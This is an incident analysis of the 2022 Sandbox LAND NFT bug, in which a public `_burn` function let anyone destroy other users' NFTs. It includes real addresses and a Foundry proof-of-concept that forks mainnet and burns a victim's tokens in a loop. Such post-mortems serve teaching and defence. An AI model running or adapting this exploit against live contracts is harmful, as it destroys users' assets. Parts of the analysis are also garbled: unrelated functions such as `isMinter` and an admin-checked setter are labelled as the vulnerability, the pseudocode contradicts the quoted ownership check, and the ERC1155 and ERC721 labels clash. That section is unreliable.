# The Sandbox — Unauthorized NFT Burn (Public `_burn` Function) Analysis

| Field | Details |
|------|------|
| **Date** | 2022-02-14 |
| **Protocol** | The Sandbox (LAND NFT) |
| **Chain** | Ethereum Mainnet |
| **Loss** | User NFT burn damage (asset destruction rather than monetary loss) |
| **Attacker** | [0x6FB0B915D0e10c3B2ae42a5DD879c3D995377A2C](https://etherscan.io/address/0x6FB0B915D0e10c3B2ae42a5DD879c3D995377A2C) |
| **Attack Tx** | Block 14,163,041 |
| **Vulnerable Contract** | LAND NFT [0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a](https://etherscan.io/address/0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a) |
| **Root Cause** | `_burn(address,address,uint256)` function declared as `public`, allowing anyone to burn another user's NFT |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-02/Sandbox_exp.sol) |

---
## 1. Vulnerability Overview

The Sandbox's LAND NFT contract contained a `_burn(address from, address to, uint256 id)` function that handled internal burn logic. This function, which should normally be implemented as `internal` or `private`, was mistakenly declared with `public` visibility.

As a result, anyone could directly call this function to burn LAND NFTs (ERC1155) held by arbitrary users. The attacker burned token ID 3738 held by victim address `0x9cfA73...` in a loop 100 times.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable LAND NFT contract (pseudocode)
contract LandToken is ERC1155 {

    // ❌ _burn declared as public — callable by anyone
    function _burn(
        address from,
        address to,     // destination address (typically ignored during burn)
        uint256 id
    ) public {
        // No ownership check
        // msg.sender can burn tokens belonging to `from`
        _balances[id][from] -= 1;
        emit TransferSingle(msg.sender, from, address(0), id, 1);
    }

    // ✅ Correct pattern
    function _burn(
        address from,
        uint256 id,
        uint256 amount
    ) internal override {  // ✅ internal — cannot be called externally
        require(
            from == msg.sender || isApprovedForAll(from, msg.sender),
            "ERC1155: caller is not owner nor approved"
        );
        super._burn(from, id, amount);
    }
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**ERC721BaseToken.sol** — Entry point:
```solidity
// ❌ Root cause: `_burn(address,address,uint256)` function declared as `public`, allowing anyone to burn another user's NFT
    function _burn(address from, address owner, uint256 id) public {  // ❌ Vulnerability
        require(from == owner, "not owner");
        _owners[id] = 2**160; // cannot mint it again
        _numNFTPerAddress[from]--;
        emit Transfer(from, address(0), id);
    }
```

**LandBaseToken.sol** — Related contract:
```solidity
// ❌ Root cause: `_burn(address,address,uint256)` function declared as `public`, allowing anyone to burn another user's NFT
    function isMinter(address who) public view returns (bool) {  // ❌ Vulnerability
        return _minters[who];
    }
```

**MetaTransactionReceiver.sol** — Related contract:
```solidity
// ❌ Root cause: `_burn(address,address,uint256)` function declared as `public`, allowing anyone to burn another user's NFT
    function setMetaTransactionProcessor(address metaTransactionProcessor, bool enabled) public {  // ❌ Vulnerability
        require(
            msg.sender == _admin,
            "only admin can setup metaTransactionProcessors"
        );
        _setMetaTransactionProcessor(metaTransactionProcessor, enabled);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Check victim's LAND NFT balance
    │       _numNFTPerAddress(victim) → 2,762
    │
    ├─[2] Loop (100 iterations)
    │       for i in range(100):
    │           LAND._burn(victim, victim, 3738)
    │           ↑ Direct call to public function
    │           No ownership/approval verification
    │
    ├─[3] Confirm victim's NFT balance decrease
    │       2,762 → 2,662 (100 burned)
    │
    └─[4] Stolen assets are unrecoverable
            Burned NFTs cannot be reversed
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface ILand {
    // ⚡ Key: _burn declared as public, allowing external calls
    function _burn(address from, address to, uint256 id) external;
    function _numNFTPerAddress(address owner) external view returns (uint256);
}

contract ContractTest is Test {
    ILand land = ILand(0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a);
    address attacker = 0x6FB0B915D0e10c3B2ae42a5DD879c3D995377A2C;
    address victim = 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C;
    uint256 constant TOKEN_ID = 3738;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_163_041);
    }

    function testExploit() public {
        uint256 balanceBefore = land._numNFTPerAddress(victim);
        emit log_named_uint("[Before] Victim LAND balance", balanceBefore);

        vm.startPrank(attacker);

        // ⚡ Burn victim's NFTs via direct call to public _burn
        // No ownership verification — attacker burns victim's NFTs
        for (uint256 i = 0; i < 100; i++) {
            land._burn(victim, victim, TOKEN_ID);
        }

        vm.stopPrank();

        uint256 balanceAfter = land._numNFTPerAddress(victim);
        emit log_named_uint("[After] Victim LAND balance", balanceAfter);
        emit log_named_uint("NFTs burned", balanceBefore - balanceAfter);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Function Visibility Error |
| **Attack Vector** | Direct call to public `_burn` function |
| **Preconditions** | None (anyone can execute the attack) |
| **Impact** | All LAND NFTs of arbitrary users can be burned |

---
## 6. Remediation Recommendations

1. **Minimize Function Visibility**: Internal logic functions must be declared `internal` or `private`. Functions prefixed with `_` conventionally denote internal functions.
2. **Burn Authorization Check**: Burn functions must verify `msg.sender == owner || isApprovedForAll(owner, msg.sender)`.
3. **Use Static Analysis Tools**: Tools such as Slither and MythX can automatically detect incorrect function visibility.
4. **Audit Checklist**: Before deployment, review all `public`/`external` function listings to confirm there are no unintended exposures.

---
## 7. Lessons Learned

- **Impact of Visibility Mistakes**: A single word difference — `public` vs `internal` — can expose all user assets to risk.
- **Irreversibility of NFTs**: Unlike ERC20 token theft, burned NFTs cannot be recovered. The damage can be more severe.
- **Importance of Code Review**: This is a vulnerability that could be caught with a simple code review. Manual review alongside automated tooling is essential.
- **Function Naming Conventions**: In Solidity, functions prefixed with `_` are conventionally internal, but this is not enforced. Visibility must be declared explicitly.